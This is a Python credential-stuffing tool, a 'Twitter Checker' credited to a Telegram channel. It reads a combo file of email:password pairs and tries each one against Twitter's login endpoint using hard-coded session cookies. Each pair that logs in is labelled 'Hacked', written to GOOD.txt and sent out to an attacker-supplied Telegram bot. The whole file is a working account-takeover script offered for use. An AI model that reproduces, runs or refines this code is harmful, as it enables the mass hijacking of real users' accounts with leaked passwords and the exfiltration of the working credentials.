
E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'

print(S+"""

        [-]  Twiter Checker
        [+] Programming By : Mala
        [+] Telegram : @team453

        """)
try:
	import requests,random,time,os,colorama,pyfiglet
except ModuleNotFoundError:
	print('\n\t>[+] @mala_bek4s')
ID=input(G+'[+] YOUR ID : ')
token=input(E+'[+] TOKEN BOT : ')
def CHECK(user,pess):
	head={
		#head-data by @mala_bek4s
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
		'Accept-Encoding': 'gzip, deflate, br',
		'Accept-Language': 'ar,en-US;q=0.7,en;q=0.3',
		'Content-Length': '901',
		'Content-Type': 'application/x-www-form-urlencoded',
		'Cookie': 'personalization_id="v1_aFGvGiam7jnp1ks4ml5SUg=="; guest_id=v1%3A161776685629025416; gt=1379640315083112449; ct0=de4b75112a3f496676a1b2eb0c95ef65; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCIA8a6p4AToMY3NyZl9p%250AZCIlM2RlMDA1MzYyNmJiMGQwYzQ1OGU2MjFhODY5ZGU5N2Y6B2lkIiU4ODM0%250AMjM5OTNlYjg0ZGExNzRiYTEwMWE0M2ZhYTM0Mw%253D%253D--f5b0bce9df3870f1a221ae914e684fbdc533d03d; external_referer=padhuUp37zjgzgv1mFWxJ12Ozwit7owX|0|8e8t2xd8A2w%3D; _mb_tk=10908ac0975311eb868c135992f7d397',
		'Host': 'twitter.com',
		'Origin': 'https://twitter.com',
		'Referer': 'https://twitter.com/login?lang=ar',
		'TE': 'Trailers',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0', }
	data={
		'redirect_after_login': '/',
		'remember_me': '1',
		'authenticity_token': '10908ac0975311eb868c135992f7d397',
		'wfa': '1',
		'ui_metrics': '{\"rf\":{\"ab4c9cdc2d5d097a5b2ccee53072aff6d2b5b13f71cef1a233ff378523d85df3\":1,\"a51091a0c1e2864360d289e822acd0aa011b3c4cabba8a9bb010341e5f31c2d2\":84,\"a8d0bb821f997487272cd2b3121307ff1e2e13576a153c3ba61aab86c3064650\":-1,\"aecae417e3f9939c1163cbe2bde001c0484c0aa326b8aa3d2143e3a5038a00f9\":84},\"s\":\"MwhiG0C4XblDIuWnq4rc5-Ua8dvIM0Z5pOdEjuEZhWsl90uNoC_UbskKKH7nds_Qdv8yCm9Np0hTMJEaLH8ngeOQc5G9TA0q__LH7_UyHq8ZpV2ZyoY7FLtB-1-Vcv6gKo40yLb4XslpzJwMsnkzFlB8YYFRhf6crKeuqMC-86h3xytWcTuX9Hvk7f5xBWleKfUBkUTzQTwfq4PFpzm2CCyVNWfs-dmsED7ofFV6fRZjsYoqYbvPn7XhWO1Ixf11Xn5njCWtMZOoOExZNkU-9CGJjW_ywDxzs6Q-VZdXGqqS7cjOzD5TdDhAbzCWScfhqXpFQKmWnxbdNEgQ871dhAAAAXiqazyE\"}',
		'session[username_or_email]': user,
		'session[password]': pess}
	try:
		time.sleep(0.5)
		req=requests.post(f'https://twitter.com/sessions',headers=head,data=data)
		if ("ct0") in req.cookies:
			print(colorama.Fore.GREEN+'--------------------------------')
			print(f'Hacked: [{user}:{pess}] ')
			YES=f"""
[✓] Hacked :
[✓] Email: {user}
[✓] Pass: {pess}
[✓] channel : @team453
━━━━━━━━━━━━━"""
			print("[/] Enjoy")
			print('--------------------------------'+colorama.Fore.RESET)
			try:
				requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={YES}\nBY : @team453')
			except:
				pass
			with open('GOOD.txt', 'a') as x:
				x.write(f'{user}:{pess}'+'\n')
		else:
			print(colorama.Fore.RED+f"Not Hacked : [{user}:{pess}]"+colorama.Fore.RESET)
	except requests.exceptions.ConnectionError:
		print(colorama.Fore.RED + "[-] !!" + colorama.Fore.RESET)
	except KeyboardInterrupt:
		exit(0)
def FILname():
	F=input(S+'[+] Combo name : ')
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	try:
		for x in open(F,'r').read().splitlines():
			user=x.split(":")[0]
			pess=x.split(":")[1]
			CHECK(user,pess)
	except FileNotFoundError:
		print(colorama.Fore.RED+'\n[-] The file name is !\n'+colorama.Fore.RESET)
		return FILname()
FILname()
